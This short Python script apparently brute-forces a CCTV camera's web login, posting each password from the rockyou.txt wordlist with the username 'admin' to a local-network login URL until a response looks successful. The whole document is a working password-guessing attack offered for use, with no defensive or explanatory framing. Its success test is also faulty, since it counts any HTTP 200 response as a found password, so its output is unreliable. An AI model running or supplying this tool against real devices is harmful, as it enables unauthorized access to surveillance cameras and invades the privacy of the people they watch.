import requests

url = 'http://192.168.1.100/login'  # Change this to your CCTV login URL
username = 'admin'  # Change if your username is different


password_field_name = 'password' 
username_field_name = 'username' 

wordlist_file = 'rockyou.txt' 
with open(wordlist_file, 'r') as file:
    for line in file:
        password = line.strip()
        data = {
            username_field_name: username,
            password_field_name: password
        }
        response = requests.post(url, data=data)

      
        if "logout" in response.text.lower() or response.status_code == 200:
            print(f"[+] Password found: {password}")
            break
        else:
            print(f"[-] Tried password: {password}")
